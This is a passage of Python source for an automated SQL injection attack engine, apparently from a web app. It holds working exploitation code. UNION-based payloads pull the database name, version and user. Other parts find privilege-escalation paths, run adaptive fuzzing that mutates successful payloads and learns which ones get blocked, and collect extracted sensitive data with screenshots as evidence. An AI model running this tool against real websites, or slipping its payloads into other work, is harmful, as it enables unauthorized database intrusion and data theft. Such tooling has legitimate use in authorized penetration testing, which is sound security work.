                                    f'Baseline: {baseline_time:.2f}s, '
                                    f'Payload: {response_time:.2f}s'
                                ),
                                'database_type': db_type,
                                'request_data': {
                                    'url': url,
                                    'method': method,
                                    'data': test_data,
                                },
                                'response_data': {
                                    'status_code': response.status_code,
                                    'response_time': response_time,
                                }
                            })
                            break
                    
                    if findings and findings[-1]['vulnerable_parameter'] == param_name:
                        break
        
        return findings
    
    def exploit_sqli(self, url: str, method: str, 
                    vulnerable_param: str, param_type: str,
                    db_type: str,
                    params: Optional[Dict] = None,
                    data: Optional[Dict] = None,
                    cookies: Optional[Dict] = None,
                    headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        Attempt to exploit SQL injection to extract information.
        
        Returns:
            Dictionary with exploitation results
        """
        exploitation_results = {
            'is_exploitable': False,
            'database_version': None,
            'current_database': None,
            'current_user': None,
            'extracted_tables': [],
            'extracted_data': {},
        }
        
        # Try to extract database version
        if db_type in self.VERSION_EXTRACTION_PAYLOADS:
            version_payload = self.VERSION_EXTRACTION_PAYLOADS[db_type]
            
            if param_type == 'GET' and params:
                test_params = params.copy()
                test_params[vulnerable_param] = version_payload
                response = self._make_request(url, method, test_params, data, cookies, headers)
            elif param_type == 'POST' and data:
                test_data = data.copy()
                test_data[vulnerable_param] = version_payload
                response = self._make_request(url, method, params, test_data, cookies, headers)
            else:
                response = None
            
            if response:
                # Try to extract version from response
                # This is simplified - real exploitation would need more sophisticated parsing
                version_patterns = [
                    r'(\d+\.\d+\.\d+)',  # Generic version pattern
                    r'MySQL\s+([\d\.]+)',
                    r'PostgreSQL\s+([\d\.]+)',
                    r'Microsoft SQL Server\s+([\d\.]+)',
                ]
                
                for pattern in version_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        exploitation_results['database_version'] = match.group(1)
                        exploitation_results['is_exploitable'] = True
                        break
        
        # Try to extract current database name (simplified)
        if db_type == 'mysql':
            db_name_payload = "' UNION SELECT database()--"
        elif db_type == 'postgresql':
            db_name_payload = "' UNION SELECT current_database()--"
        elif db_type == 'mssql':
            db_name_payload = "' UNION SELECT DB_NAME()--"
        else:
            db_name_payload = None
        
        if db_name_payload:
            if param_type == 'GET' and params:
                test_params = params.copy()
                test_params[vulnerable_param] = db_name_payload
                response = self._make_request(url, method, test_params, data, cookies, headers)
            elif param_type == 'POST' and data:
                test_data = data.copy()
                test_data[vulnerable_param] = db_name_payload
                response = self._make_request(url, method, params, test_data, cookies, headers)
            else:
                response = None
            
            if response:
                # Simple extraction (would need more sophisticated parsing)
                db_name_match = re.search(r'database[:\s]+([a-zA-Z0-9_]+)', 
                                         response.text, re.IGNORECASE)
                if db_name_match:
                    exploitation_results['current_database'] = db_name_match.group(1)
                    exploitation_results['is_exploitable'] = True
        
        # Try to extract current user (simplified)
        if db_type == 'mysql':
            user_payload = "' UNION SELECT user()--"
        elif db_type == 'postgresql':
            user_payload = "' UNION SELECT current_user--"
        elif db_type == 'mssql':
            user_payload = "' UNION SELECT SYSTEM_USER--"
        else:
            user_payload = None
        
        if user_payload:
            if param_type == 'GET' and params:
                test_params = params.copy()
                test_params[vulnerable_param] = user_payload
                response = self._make_request(url, method, test_params, data, cookies, headers)
            elif param_type == 'POST' and data:
                test_data = data.copy()
                test_data[vulnerable_param] = user_payload
                response = self._make_request(url, method, params, test_data, cookies, headers)
            else:
                response = None
            
            if response:
                user_match = re.search(r'user[:\s]+([a-zA-Z0-9_@\.-]+)', 
                                      response.text, re.IGNORECASE)
                if user_match:
                    exploitation_results['current_user'] = user_match.group(1)
                    exploitation_results['is_exploitable'] = True
        
        return exploitation_results
    
    def perform_comprehensive_analysis(self, url: str, method: str,
                                      vulnerable_param: str, param_type: str,
                                      db_type: str, response_text: str = None,
                                      params: Optional[Dict] = None,
                                      data: Optional[Dict] = None,
                                      cookies: Optional[Dict] = None,
                                      headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        Perform comprehensive database analysis including fingerprinting and privilege escalation.
        
        Args:
            url: Target URL
            method: HTTP method
            vulnerable_param: Vulnerable parameter
            param_type: Parameter type (GET/POST)
            db_type: Detected database type
            response_text: Response text for fingerprinting
            params, data, cookies, headers: Request parameters
        
        Returns:
            Dictionary with comprehensive analysis results
        """
        analysis = {
            'fingerprint': None,
            'privileges': None,
            'capabilities': None,
            'escalation_paths': None,
            'attack_profile': None,
        }
        
        logger.info("Performing comprehensive database analysis...")
        
        # Step 1: Advanced fingerprinting
        if self.use_fingerprinting and response_text:
            try:
                logger.info("Running advanced database fingerprinting...")
                fingerprint = self.db_fingerprinter.fingerprint(
                    response_text=response_text,
                    error_text=response_text,
                    test_function=None,  # Would pass a test function in full implementation
                    vulnerable_param=vulnerable_param,
                    param_type=param_type
                )
                
                analysis['fingerprint'] = {
                    'db_type': fingerprint.db_type.value,
                    'version': fingerprint.version,
                    'edition': fingerprint.edition,
                    'features': fingerprint.features,
                    'privileges': fingerprint.privileges,
                    'confidence': fingerprint.confidence,
                }
                
                # Generate attack profile
                attack_profile = self.db_fingerprinter.generate_attack_profile(fingerprint)
                analysis['attack_profile'] = attack_profile
                
                logger.info(f"Fingerprinting complete: {fingerprint.db_type.value} {fingerprint.version or 'unknown'}")
                logger.info(f"Estimated success rate: {attack_profile['estimated_success_rate']:.1%}")
                
            except Exception as e:
                logger.error(f"Fingerprinting failed: {e}")
        
        # Step 2: Privilege escalation analysis
        if self.use_priv_escalation:
            try:
                logger.info("Analyzing privilege escalation opportunities...")
                
                # Detect current privileges
                privileges = self.priv_escalation.detect_current_privileges(
                    engine=self,
                    url=url,
                    method=method,
                    vulnerable_param=vulnerable_param,
                    param_type=param_type,
                    db_type=db_type,
                    params=params,
                    data=data,
                    cookies=cookies,
                    headers=headers
                )
                
                analysis['privileges'] = privileges
                logger.info(f"Detected privilege level: {privileges.get('privilege_level')}")
                
                # Detect dangerous capabilities
                capabilities = self.priv_escalation.detect_dangerous_capabilities(
                    engine=self,
                    url=url,
                    method=method,
                    vulnerable_param=vulnerable_param,
                    param_type=param_type,
                    db_type=db_type,
                    params=params,
                    data=data,
                    cookies=cookies,
                    headers=headers
                )
                
                analysis['capabilities'] = {cap.value: avail for cap, avail in capabilities.items()}
                dangerous_count = sum(1 for avail in capabilities.values() if avail)
                if dangerous_count > 0:
                    logger.warning(f"Found {dangerous_count} dangerous capabilities!")
                
                # Find escalation paths
                escalation_paths = self.priv_escalation.find_escalation_paths(
                    db_type=db_type,
                    privileges=privileges,
                    capabilities=capabilities
                )
                
                if escalation_paths:
                    analysis['escalation_paths'] = [
                        {
                            'name': path.name,
                            'description': path.description,
                            'risk_level': path.risk_level,
                            'exploitability': path.exploitability,
                            'steps': path.steps,
                            'payloads': path.payloads
                        }
                        for path in escalation_paths
                    ]
                    logger.warning(f"Found {len(escalation_paths)} privilege escalation paths!")
                
            except Exception as e:
                logger.error(f"Privilege escalation analysis failed: {e}")
        
        return analysis
    
    def run_full_attack(self, url: str, method: str = 'GET',
                       params: Optional[Dict] = None,
                       data: Optional[Dict] = None,
                       cookies: Optional[Dict] = None,
                       headers: Optional[Dict] = None,
                       enable_error_based: bool = True,
                       enable_time_based: bool = True,
                       enable_exploitation: bool = True,
                       json_data: Optional[Dict] = None) -> List[Dict]:
        """
        Run full SQL injection attack with all enabled techniques.
        Enhanced with advanced payloads, false positive reduction, and impact demonstration.
        NOW WITH COMPREHENSIVE INPUT VECTOR TESTING for cookies, headers, and parameter names.
        
        Args:
            url: Target URL
            method: HTTP method (GET, POST, etc.)
            params: URL query parameters
            data: POST form data
            cookies: HTTP cookies
            headers: HTTP headers
            enable_error_based: Enable error-based testing
            enable_time_based: Enable time-based testing
            enable_exploitation: Enable exploitation
            json_data: JSON POST data (optional)
        
        Returns:
            List of all findings with exploitation results and impact analysis
        """
        all_findings = []
        
        logger.info(f"Starting enhanced SQL injection scan on {url}")
        logger.info(f"Advanced payloads: {self.use_advanced_payloads}, FP reduction: {self.use_fp_reduction}, Impact demo: {self.use_impact_demo}")
        logger.info(f"Comprehensive testing: {self.use_comprehensive_testing}")
        
        # NEW: Comprehensive input vector testing (cookies, headers, param names)
        if self.use_comprehensive_testing:
            logger.info("Running comprehensive input vector tests (cookies, headers, param names)...")
            comprehensive_findings = self.comprehensive_tester.test_all_vectors(
                url, method, params, data, cookies, headers, json_data
            )
            all_findings.extend(comprehensive_findings)
            logger.info(f"Found {len(comprehensive_findings)} vulnerabilities via comprehensive testing")
        
        # Error-based detection
        if enable_error_based:
            logger.info("Running error-based SQL injection tests...")
            error_findings = self.test_error_based_sqli(
                url, method, params, data, cookies, headers
            )
            all_findings.extend(error_findings)
            logger.info(f"Found {len(error_findings)} error-based vulnerabilities")
        
        # Time-based detection
        if enable_time_based:
            logger.info("Running time-based SQL injection tests...")
            time_findings = self.test_time_based_sqli(
                url, method, params, data, cookies, headers
            )
            all_findings.extend(time_findings)
            logger.info(f"Found {len(time_findings)} time-based vulnerabilities")
        
        # Enhanced exploitation and impact demonstration
        if all_findings:
            for finding in all_findings:
                # Comprehensive analysis (fingerprinting + privilege escalation)
                if self.use_fingerprinting or self.use_priv_escalation:
                    logger.info(f"Running comprehensive analysis for {finding['vulnerable_parameter']}...")
                    try:
                        comprehensive_analysis = self.perform_comprehensive_analysis(
                            url=url,
                            method=method,
                            vulnerable_param=finding['vulnerable_parameter'],
                            param_type=finding['parameter_type'],
                            db_type=finding.get('database_type', 'mysql'),
                            response_text=finding.get('response', ''),
                            params=params,
                            data=data,
                            cookies=cookies,
                            headers=headers
                        )
                        finding['comprehensive_analysis'] = comprehensive_analysis
                        
                        # Enhance risk score based on analysis
                        if comprehensive_analysis.get('escalation_paths'):
                            # Increase risk if privilege escalation is possible
                            max_exploitability = max(
                                [p['exploitability'] for p in comprehensive_analysis['escalation_paths']],
                                default=0.0
                            )
                            finding['escalation_risk'] = max_exploitability
                            logger.warning(f"Privilege escalation possible (exploitability: {max_exploitability:.1%})")
                        
                    except Exception as e:
                        logger.error(f"Comprehensive analysis failed: {e}")
                
                # Basic exploitation
                if enable_exploitation and finding.get('database_type'):
                    logger.info(f"Attempting exploitation of {finding['vulnerable_parameter']}...")
                    exploitation_results = self.exploit_sqli(
                        url=url,
                        method=method,
                        vulnerable_param=finding['vulnerable_parameter'],
                        param_type=finding['parameter_type'],
                        db_type=finding['database_type'],
                        params=params,
                        data=data,
                        cookies=cookies,
                        headers=headers
                    )
                    finding['exploitation'] = exploitation_results
                
                # Impact demonstration (NEW!)
                if self.use_impact_demo and finding.get('database_type'):
                    logger.info(f"Demonstrating impact for {finding['vulnerable_parameter']}...")
                    try:
                        impact_results = self.impact_demo.demonstrate_impact(
                            url=url,
                            method=method,
                            vulnerable_param=finding['vulnerable_parameter'],
                            param_type=finding['parameter_type'],
                            db_type=finding['database_type'],
                            params=params,
                            data=data,
                            cookies=cookies,
                            headers=headers
                        )
                        finding['impact_analysis'] = impact_results
                        finding['severity'] = impact_results['severity']
                        finding['risk_score'] = impact_results['risk_score']
                        
                        logger.info(f"Impact analysis complete: severity={impact_results['severity']}, risk_score={impact_results['risk_score']}")
                    except Exception as e:
                        logger.error(f"Impact demonstration failed: {e}")
                        finding['impact_analysis'] = {
                            'error': str(e),
                            'severity': 'medium',
                            'risk_score': 50
                        }
        
        logger.info(f"Scan complete. Total findings: {len(all_findings)}")
        return all_findings
    
    def test_adaptive_sqli(self, url: str, method: str = 'GET',
                          params: Optional[Dict] = None,
                          data: Optional[Dict] = None,
                          cookies: Optional[Dict] = None,
                          headers: Optional[Dict] = None,
                          max_payloads: int = 50) -> List[Dict]:
        """
        Test for SQL injection using adaptive payload selection and fuzzy logic detection.
        
        This method uses:
        - Comprehensive payload library (1000+ payloads)
        - Real-time learning from response patterns
        - Fuzzy logic for false positive reduction
        - Adaptive mutation of successful payloads
        
        Args:
            url: Target URL
            method: HTTP method
            params: URL parameters
            data: POST data
            cookies: HTTP cookies
            headers: HTTP headers
            max_payloads: Maximum number of payloads to try per parameter
            
        Returns:
            List of vulnerability findings
        """
        findings = []
        
        logger.info(f"Starting adaptive SQL injection test with {len(self.payload_integration.payloads)} payloads")
        
        # Get baseline response for fuzzy detection
        baseline_response = self._make_request(url, method, params, data, cookies, headers)
        if not baseline_response:
            logger.warning("Could not get baseline response")
            return findings
        
        # Set baseline for fuzzy detector
        self.fuzzy_detector.set_baseline(
            status_code=baseline_response.status_code,
            headers=dict(baseline_response.headers),
            body=baseline_response.text,
            response_time=baseline_response.elapsed.total_seconds()
        )
        
        # Test GET parameters
        if params:
            for param_name, param_value in params.items():
                logger.info(f"Testing parameter: {param_name}")
                
                # Get initial payloads from the comprehensive library
                all_payloads = list(self.payload_integration.payloads.values())
                payloads_tested = 0
                
                for payload_obj in all_payloads[:max_payloads]:
                    payload = payload_obj.content
                    
                    # Create test request
                    test_params = params.copy()
                    test_params[param_name] = str(param_value) + payload
                    
                    # Make request
                    start_time = time.time()
                    response = self._make_request(url, method, test_params, data, cookies, headers)
                    response_time = time.time() - start_time
                    
                    if not response:
                        continue
                    
                    payloads_tested += 1
                    
                    # Analyze response with fuzzy logic
                    fuzzy_result = self.fuzzy_detector.analyze_response(
                        status_code=response.status_code,
                        headers=dict(response.headers),
                        body=response.text,
                        response_time=response_time,
                        payload=payload
                    )
                    
                    # Classify response for adaptive selector
                    if fuzzy_result.verdict == "vulnerable":
                        response_class = ResponseClass.SUCCESS
                    elif fuzzy_result.verdict == "suspicious":
                        response_class = ResponseClass.ERROR
                    elif "block" in response.text.lower() or response.status_code == 403:
                        response_class = ResponseClass.BLOCKED
                    else:
                        response_class = ResponseClass.ALLOWED
                    
                    # Record attempt in adaptive selector
                    self.adaptive_selector.record_attempt(
                        payload=payload,
                        response_class=response_class,
                        response_time=response_time,
                        status_code=response.status_code,
                        response_body=response.text,
                        payload_category=payload_obj.category
                    )
                    
                    # If vulnerability detected with high confidence
                    if fuzzy_result.verdict in ["vulnerable", "suspicious"] and \
                       fuzzy_result.confidence >= self.fuzzy_detector.confidence_threshold:
                        
                        finding = {
                            'injection_type': 'adaptive_detection',
                            'vulnerable_parameter': param_name,
                            'parameter_type': 'GET',
                            'test_payload': test_params[param_name],
                            'detection_method': 'fuzzy_logic',
                            'verdict': fuzzy_result.verdict,
                            'confidence_score': fuzzy_result.confidence,
                            'similarity_score': fuzzy_result.similarity_score,
                            'matched_patterns': fuzzy_result.matched_patterns,
                            'anomaly_indicators': fuzzy_result.anomaly_indicators,
                            'request_data': {
                                'url': url,
                                'method': method,
                                'params': test_params,
                            },
                            'response_data': {
                                'status_code': response.status_code,
                                'response_time': response_time,
                            },
                        }
                        
                        findings.append(finding)
                        logger.info(f"Vulnerability detected in {param_name} (confidence: {fuzzy_result.confidence:.2%})")
                        
                        # Generate mutations of successful payload
                        mutations = self.adaptive_selector.generate_mutations(payload, count=5)
                        logger.info(f"Generated {len(mutations)} mutations to test")
                        
                        # Test mutations for confirmation
                        for mutation in mutations:
                            test_params_mut = params.copy()
                            test_params_mut[param_name] = str(param_value) + mutation
                            
                            response_mut = self._make_request(url, method, test_params_mut, data, cookies, headers)
                            if response_mut:
                                fuzzy_result_mut = self.fuzzy_detector.analyze_response(
                                    status_code=response_mut.status_code,
                                    headers=dict(response_mut.headers),
                                    body=response_mut.text,
                                    response_time=response_mut.elapsed.total_seconds(),
                                    payload=mutation
                                )
                                
                                if fuzzy_result_mut.verdict == "vulnerable":
                                    finding['confirmed_with_mutation'] = True
                                    finding['confirming_payload'] = mutation
                                    logger.info(f"Confirmed with mutation: {mutation[:50]}...")
                                    break
                        
                        # If we found a vulnerability, no need to test all payloads
                        if finding.get('confirmed_with_mutation'):
                            break
                
                logger.info(f"Tested {payloads_tested} payloads for {param_name}")
        
        # Log adaptive selector statistics
        stats = self.adaptive_selector.get_statistics()
        logger.info(f"Adaptive selector stats: {stats['total_payloads_tried']} payloads tried, "
                   f"{stats['overall_success_rate']:.2%} success rate")
        
        # Log filter insights
        insights = self.adaptive_selector.get_filter_insights()
        if insights['recommendations']:
            logger.info(f"Filter insights: {insights['recommendations']}")
        
        return findings

    # ------------------------------------------------------------------
    # Evidence-enhanced attack execution
    # ------------------------------------------------------------------

    def execute_attack_with_evidence(
        self,
        task,
        params_to_test: Dict,
        enable_visual_capture: bool = True,
    ) -> Dict:
        """
        Run the full SQL injection attack and collect comprehensive evidence.

        Optionally initialises a VisualEvidenceCapture instance (Selenium-based)
        that captures before/after screenshots and an animated GIF.  Visual
        capture is purely additive – if it cannot be initialised the attack
        runs normally and all non-visual evidence is still collected.

        Args:
            task: SQLInjectionTask model instance.
            params_to_test: Merged GET/POST parameter dict to test.
            enable_visual_capture: Whether to attempt browser-based screenshots.

        Returns:
            A dict with keys:
                all_injection_points  – list of every injection point found
                successful_payloads   – dict keyed by injection type
                extracted_sensitive_data – categorised extracted data
                visual_evidence       – screenshots, gif path, timeline
        """
        from .evidence_capture import VisualEvidenceCapture
        from django.conf import settings as django_settings

        # ------------------------------------------------------------------
        # 1. Initialise optional visual capture
        # ------------------------------------------------------------------
        evidence_dir = getattr(
            django_settings,
            'SQL_ATTACKER_EVIDENCE_DIR',
            None,
        )
        capture = VisualEvidenceCapture(evidence_dir=evidence_dir)

        if enable_visual_capture and getattr(
            django_settings, 'SQL_ATTACKER_ENABLE_VISUAL_EVIDENCE', True
        ):
            headless = getattr(django_settings, 'SQL_ATTACKER_HEADLESS_BROWSER', True)
            capture.initialize_browser(headless=headless)

        # ------------------------------------------------------------------
        # 2. Capture baseline screenshot
        # ------------------------------------------------------------------
        capture.capture_baseline_screenshot(task.target_url, params_to_test)

        # ------------------------------------------------------------------
        # 3. Run the full attack
        # ------------------------------------------------------------------
        findings = self.run_full_attack(
            url=task.target_url,
            method=task.http_method,
            params=task.get_params_dict(),
            data=task.get_post_dict(),
            cookies=task.get_cookies_dict(),
            headers=task.get_headers_dict(),
            enable_error_based=task.enable_error_based,
            enable_time_based=task.enable_time_based,
            enable_exploitation=task.enable_exploitation,
        )

        # ------------------------------------------------------------------
        # 4. Collect and categorise results
        # ------------------------------------------------------------------
        all_injection_points: List[Dict] = []
        successful_payloads: Dict[str, List[Dict]] = {}
        extracted_sensitive_data: Dict[str, Any] = {}

        for finding in findings:
            injection_type = finding.get('injection_type', 'error_based')
            param_name = finding.get('vulnerable_parameter', 'unknown')
            payload = finding.get('test_payload', '')

            # --- Injection points list ---
            all_injection_points.append(
                {
                    'parameter': param_name,
                    'type': finding.get('parameter_type', 'GET'),
                    'source': finding.get('parameter_source', 'manual'),
                    'injection_type': injection_type,
                    'payload': payload,
                    'confidence': finding.get('confidence_score', 0.7),
                    'timestamp': finding.get('detected_at', ''),
                }
            )

            # --- Successful payloads grouped by type ---
            if injection_type not in successful_payloads:
                successful_payloads[injection_type] = []
            successful_payloads[injection_type].append(
                {
                    'payload': payload,
                    'parameter': param_name,
                    'evidence': finding.get('detection_evidence', ''),
                }
            )

            # --- Capture screenshot for this finding ---
            capture.capture_injection_screenshot(
                task.target_url,
                params_to_test,
                payload,
                injection_type,
            )

            # --- Aggregate extracted sensitive data ---
            exploitation = finding.get('exploitation', {})
            impact = finding.get('impact_analysis', {})

            db_info = []
            if exploitation.get('database_version'):
                db_info.append(exploitation['database_version'])
            if exploitation.get('current_database'):
                db_info.append(exploitation['current_database'])
            if exploitation.get('current_user'):
                db_info.append(exploitation['current_user'])
            if db_info:
                existing = extracted_sensitive_data.get('database_info', [])
                extracted_sensitive_data['database_info'] = list(
                    dict.fromkeys(existing + db_info)
                )

            tables = exploitation.get('extracted_tables', []) or \
                impact.get('extracted_info', {}).get('schema', {}).get('tables', [])
            if tables:
                existing_tables = extracted_sensitive_data.get('tables', [])
                extracted_sensitive_data['tables'] = list(
                    dict.fromkeys(existing_tables + tables)
                )

            sample_data = exploitation.get('extracted_data', []) or \
                impact.get('extracted_info', {}).get('sample_data', [])
            if sample_data:
                existing_samples = extracted_sensitive_data.get('sample_data', [])
                extracted_sensitive_data['sample_data'] = (
                    existing_samples + (sample_data if isinstance(sample_data, list) else [sample_data])
                )

        # ------------------------------------------------------------------
        # 5. Capture exploitation screenshot if we found anything
        # ------------------------------------------------------------------
        if extracted_sensitive_data:
            capture.capture_exploitation_screenshot(
                task.target_url,
                params_to_test,
                extracted_sensitive_data,
            )

        # ------------------------------------------------------------------
        # 6. Build evidence package and clean up
        # ------------------------------------------------------------------
        visual_evidence = capture.get_evidence_package()
        capture.cleanup()

        return {
            'all_injection_points': all_injection_points,
            'successful_payloads': successful_payloads,
            'extracted_sensitive_data': extracted_sensitive_data,
            'visual_evidence': visual_evidence,
            '_raw_findings': findings,
        }
